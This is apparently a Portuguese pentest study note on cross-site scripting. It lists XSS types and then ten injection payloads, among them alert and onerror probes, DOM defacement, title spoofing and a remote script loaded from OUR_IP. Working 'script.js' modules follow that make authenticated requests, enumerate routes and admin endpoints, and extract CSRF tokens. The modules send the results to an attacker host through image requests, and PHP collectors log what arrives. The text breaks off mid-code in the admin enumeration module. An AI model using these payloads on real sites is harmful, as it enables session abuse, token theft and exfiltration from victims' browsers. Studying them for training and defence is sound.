---
title: Cross-Site Scripting
---

### 1. Tipos de XSS

{{< tabs items="Reflected XSS, Stored XSS, DOM-based XSS, Self-XSS" >}}

{{< tab >}}

#### **Reflected XSS**

Ocorre quando o dado enviado pelo usuário é devolvido **imediatamente** na resposta HTTP, inserido no HTML sem escaping. Qualquer interpretação direta pelo navegador resulta na execução do payload.
{{< /tab >}}

{{< tab >}}

#### **Stored XSS**

O payload é **persistido** no servidor (banco, arquivo, cache, comentário, perfil). Quando uma página carrega esse conteúdo, o navegador executa o JavaScript integrado.
{{< /tab >}}

{{< tab >}}

#### **DOM-based XSS**

O front-end manipula valores controlados pelo usuário e os insere no DOM sem validação. A vulnerabilidade está no JavaScript do cliente, não no servidor.
{{< /tab >}}

{{< tab >}}

#### **Self-XSS**

Requer que a própria vítima **digite ou cole** o código no navegador. Não é explorável remotamente.
{{< /tab >}}
{{< /tabs >}}

---

### 2. Técnicas de exploração XSS

#### **Técnica 1 — Execução Direta via `<script>`**

**Conceito:**

Usada como verificação inicial para confirmar se o navegador executa JavaScript injetado e identificar o contexto de execução (`window.origin`).

**Requisitos:**

* Reflexão direta no HTML (Reflected/Stored XSS)
* Contexto **HTML** não filtrado
* `<script>` não bloqueado por WAF ou sanitização

**Exemplo:**

```html
<script>alert(window.origin)</script>
```

---

#### **Técnica 2 — Quebra Estrutural via `<plaintext>`**

**Conceito:**

Transforma todo o restante do documento em texto puro, revelando ausência de escaping ou sanitização.

**Requisitos:**

* Reflexão direta em contexto HTML
* Navegador aceitando `<plaintext>` como delimitador
* Nenhum filtro removendo tags desconhecidas

**Exemplo:**

```html
<plaintext>
```

---

#### **Técnica 3 — Execução Alternativa via `print()`**

**Conceito:**

Quando `alert()` é bloqueado, `print()` confirma execução de JavaScript de forma silenciosa.

**Requisitos:**

* `<script>` permitido
* Função `print()` disponível no ambiente do navegador

**Exemplo:**

```html
<script>print()</script>
```

---

#### **Técnica 4 — Execução via Evento HTML (`onerror`)**

**Conceito:**

Abusa de eventos HTML para executar código quando `<script>` é filtrado.

**Requisitos:**

* Injeção em contexto HTML
* Elementos com atributos de evento permitidos
* `onerror` não sanitizado

**Exemplo:**

```html
<img src="" onerror=alert(window.origin)>
```

---

#### **Técnica 5 — Manipulação Direta do DOM (CSS)**

**Conceito:**

Demonstra controle programático do DOM alterando o estilo da interface.

**Requisitos:**

* Execução de JavaScript permitida
* Acesso à árvore do DOM

**Exemplo:**

```html
<script>document.body.style.background = "#141d2b"</script>
```

---

#### **Técnica 6 — Injeção de Imagem de Fundo**

**Conceito:**
Altera a imagem de fundo do `body` carregando um recurso externo, demonstrando controle visual completo da página e capacidade de forçar o carregamento de conteúdo remoto (útil para defacement, engenharia social e validação de impacto além de `alert()`).

**Requisitos:**

* Execução de JavaScript ativa
* `document.body` acessível

**Exemplo:**

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

---

#### **Técnica 7 — Manipulação de Metadados (Título)**

**Conceito:**

Controla o título da página, útil para engenharia social.

**Requisitos:**

* Execução de JavaScript
* Acesso ao `document.title`

**Exemplo:**

```html
<script>document.title = 'HackTheBox Academy'</script>
```

---

#### **Técnica 8 — Sobrescrita Completa do Documento**

**Conceito:**

Mostra controle absoluto sobre o DOM ao substituir totalmente o conteúdo visível.

**Requisitos:**

* Execução de JavaScript
* Permissão de alterar `innerHTML`

**Exemplo:**

```html
<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>
```

---

#### **Técnica 9 — Remoção Cirúrgica de Elementos**

**Conceito:**

Remove elementos específicos, demonstrando controle seletivo do DOM.

**Requisitos:**

* Execução de JavaScript
* IDs acessíveis no DOM

**Exemplo:**

```html
<script>document.getElementById('urlform').remove();</script>
```

---

#### **Técnica 10 — Payload Remoto de Agente (`script.js`)**

**Conceito:**

Carrega um **agente externo** capaz de executar ações autenticadas, realizar recon, extrair informações e enviar telemetria.

**Requisitos:**

* Execução de JavaScript
* O navegador deve conseguir carregar scripts externos
* Conectividade com o servidor do agente (`OUR_IP`)
* SameSite do cookie permitindo request a partir da página carregada

**Injeção:**

```html
<script src="http://OUR_IP/script.js"></script>
```

---

#### **Módulo A — Recon Autenticado de Superfície**

**Conceito:**

Enumera rotas internas acessíveis ao usuário e revela permissões efetivas.

**Requisitos:**

* Cookies válidos
* Endpoints acessíveis via `fetch()`

**script.js**

```javascript
(async () => {
  const targets = ["/", "/home.php", "/profile", "/settings", "/admin", "/api/users/me"];
  const summary = [];

  for (const path of targets) {
    try {
      const response = await fetch(path, { credentials: "include" });
      summary.push(`${path}:${response.status}`);
    } catch {
      summary.push(`${path}:ERR`);
    }
  }

  new Image().src =
    "http://OUR_IP/index.php?recon=" + encodeURIComponent(summary.join(","));
})();
```

**index.php**

```php
<?php
// Coletor A — Recon autenticado
$linha = date('c') . ' ' . ($_GET['recon'] ?? '') . PHP_EOL;
file_put_contents('recon.txt', $linha, FILE_APPEND);
```

**Funcionamento:**
O JavaScript percorre uma lista de rotas, faz requisições autenticadas com `credentials: "include"` e monta pares `rota:status`. Em seguida, envia esse resumo para `index.php` via uma requisição de imagem. O PHP recebe o parâmetro `recon` e registra cada linha, com timestamp, em `recon.txt`.

---

#### **Módulo B — Extração de Estruturas HTML**

**Conceito:**

Obtém valores expostos no DOM (por exemplo, tokens em campos ocultos), úteis para entender fluxos protegidos por parâmetros internos.

**Requisitos:**

* Página acessível com sessão válida
* Suporte a `DOMParser` no navegador

**script.js**

```javascript
(async () => {
  const response = await fetch("/home.php", {
    method: "GET",
    credentials: "include"
  });

  const html = await response.text();
  const doc = new DOMParser().parseFromString(html, "text/html");

  const token =
    doc.querySelector("input[name='csrf_token']")?.value ||
    doc.querySelector("#csrf_token")?.value ||
    "NOT_FOUND";

  new Image().src =
    "http://OUR_IP/index.php?token=" + encodeURIComponent(token);
})();
```

**index.php**

```php
<?php
// Coletor B — Valores extraídos do HTML
$linha = date('c') . ' ' . ($_GET['token'] ?? '') . PHP_EOL;
file_put_contents('tokens.txt', $linha, FILE_APPEND);
```

**Funcionamento:**
O JavaScript busca `/home.php`, faz o parse do HTML, extrai o valor de um campo de token e envia esse valor em `token` para o coletor. O PHP registra cada token recebido, com timestamp, em `tokens.txt`.

---

#### **Módulo C — Enumeração de Endpoints Privilegiados**

**Conceito:**

Verifica quais rotas administrativas existem e como respondem para o usuário atual, evidenciando permissões implícitas.

**Requisitos:**

* Sessão autenticada
* Endpoints administrativos acessíveis ao menos para verificação (não necessariamente autorizados)

**script.js**

```javascript
(async () => {
  const endpoints = [
    "/admin/panel",
    "/admin/users",
    "/admin/logs",
    "/admin/settings",
    "/api/admin/panel"
  ];

  const output = [];

  for (const ep of endpoints) {
    try {
      const resp = await fetch(ep, {
        method: "GET",
        credentials: "include"
      });

      if (resp.status !== 404) {
        output.push(`${ep}:${

```
